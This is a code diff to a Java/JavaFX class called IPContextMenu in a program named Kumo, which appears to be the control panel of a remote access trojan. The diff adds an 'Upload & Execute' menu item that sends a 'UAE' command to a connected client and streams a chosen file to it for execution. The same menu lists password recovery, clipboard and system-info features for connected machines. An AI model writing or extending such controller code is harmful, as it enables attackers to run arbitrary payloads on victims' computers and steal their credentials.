@@ -107,6 +107,33 @@ class IPContextMenu implements Repository {
             });
         });
 
+        MenuItem si10 = new MenuItem("Upload & Execute");
+        si10.setOnAction(event -> {
+
+            if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
+                try {
+                    FileChooser fileChooser = new FileChooser();
+                    fileChooser.setTitle("Select file to upload & execute");
+                    File selectedFile = fileChooser.showOpenDialog(Kumo.getPrimaryStage());
+                    FileContextMenu.selectedDirectory = selectedFile.getAbsolutePath();
+                    clientObject.clientCommunicate("UAE ;;" + selectedFile.getName());
+
+                    Long length = selectedFile.length();
+                    DataOutputStream dos = new DataOutputStream(clientObject.getClient().getOutputStream());
+                    dos.writeLong(length);
+                    FileInputStream fis = new FileInputStream(selectedFile);
+                    BufferedInputStream bs = new BufferedInputStream(fis);
+
+                    int fbyte;
+                    while ((fbyte = bs.read()) != -1) dos.writeInt(fbyte);
+                    bs.close();
+                    fis.close();
+                } catch (IOException e1) {
+                    e1.printStackTrace();
+                }
+            }
+        });
+
         MenuItem si6 = new MenuItem("System Info");
         si6.setOnAction(event -> {
             Stage stage = new Stage();
@@ -391,7 +418,7 @@ class IPContextMenu implements Repository {
             }
         });
 
-        mi1.getItems().addAll(sb1, sb2, si4, si5, si6, si7, si8, si9, clip, pwdRecovery, misc, update);
+        mi1.getItems().addAll(sb1, sb2, si4, si5, si6, si7, si10, si8, si9, clip, pwdRecovery, misc, update);
         MenuItem mi2 = new MenuItem("Copy IP");
         mi2.setOnAction(event -> {
             final Clipboard clipboard = Clipboard.getSystemClipboard();
